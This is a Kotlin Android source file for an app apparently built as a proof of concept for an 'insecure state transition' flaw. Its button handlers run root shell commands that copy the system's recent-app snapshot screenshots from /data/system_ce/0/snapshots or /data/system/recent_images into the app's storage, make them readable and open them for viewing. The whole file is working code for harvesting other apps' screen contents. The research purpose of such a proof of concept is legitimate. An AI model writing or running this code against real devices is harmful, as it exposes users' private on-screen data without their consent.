package com.exploit.isspoc

import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.util.Log
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.padding
import androidx.compose.material3.Button
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.setValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.res.stringResource
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.tooling.preview.Preview
import androidx.compose.ui.unit.dp
import com.exploit.isspoc.ui.theme.ISSPoCTheme
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.io.IOException

class MainActivity : ComponentActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContent {
            ISSPoCTheme {
                MainPage(Modifier.fillMaxSize())
            }
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val dir = filesDir
                dir.listFiles()?.forEach { it.delete() }
            } catch (e: IOException) {
                Log.d("ERROR", "Error clearing up the files: ${e.message}")
            }
        }
    }
}

fun executeCommand(cmd: Array<String>): Boolean {
    return try {
        val process = ProcessBuilder(*cmd).start()
        process.waitFor()
        Log.d("INFO", "Running $cmd")
        process.exitValue() == 0
    } catch (e: IOException) {
        Log.e("ERROR", "Command execution failed: ${e.message}")
        false
    }
}

fun copyScreenshots(context: Context): Boolean {
    val path = context.filesDir.absolutePath
    val cmd = arrayOf("su", "-c", "cp -r /data/system_ce/0/snapshots/*.jpg $path")
    val altCmd = arrayOf("su", "-c", "cp -r /data/system/recent_images/*.jpg $path")

    return try {
        val result = executeCommand(cmd)
        if (!result) {
            executeCommand(altCmd)
        }

        val fileList = context.fileList()
        if (fileList.isNotEmpty()) {
            Log.d("INFO", "${fileList.size} snapshot files retrieved.")
            true
        } else {
            Log.d("INFO", "No snapshot files found.")
            false
        }
    } catch (e: IOException) {
        Log.e("ERROR", "Failed to copy screenshots: ${e.message}")
        false
    }
}


@Composable
fun MainPage(modifier: Modifier = Modifier) {
    val context = LocalContext.current
    var enabled by remember {
        mutableStateOf(false)
    }

    Column(modifier.padding(30.dp),
        verticalArrangement = Arrangement.Center,
        horizontalAlignment = Alignment.CenterHorizontally) {
        Text(
            text = stringResource(R.string.insecure_state_transition_poc),
            textAlign = TextAlign.Center,
            modifier = Modifier.padding(16.dp)
        )

        Button(onClick = {
            enabled = copyScreenshots(context)
            Toast.makeText(context,
                "${context.fileList().size} snapshot files retrieved.",
                Toast.LENGTH_SHORT).show()
        }) {
            Text(stringResource(R.string.pull_snapshots))
        }

        Button(enabled = enabled,
            onClick = {
                with(context.filesDir.absolutePath) {
                    executeCommand(arrayOf("su", "-c", "chmod", "+r", "$this/*"))
                }
            context.startActivity(Intent(context, Files::class.java))
        }) {
            Text(stringResource(R.string.pick_snapshot))
        }
    }
}

@Preview(showBackground = true)
@Composable
fun GreetingPreview() {
    ISSPoCTheme {
        MainPage()
    }
}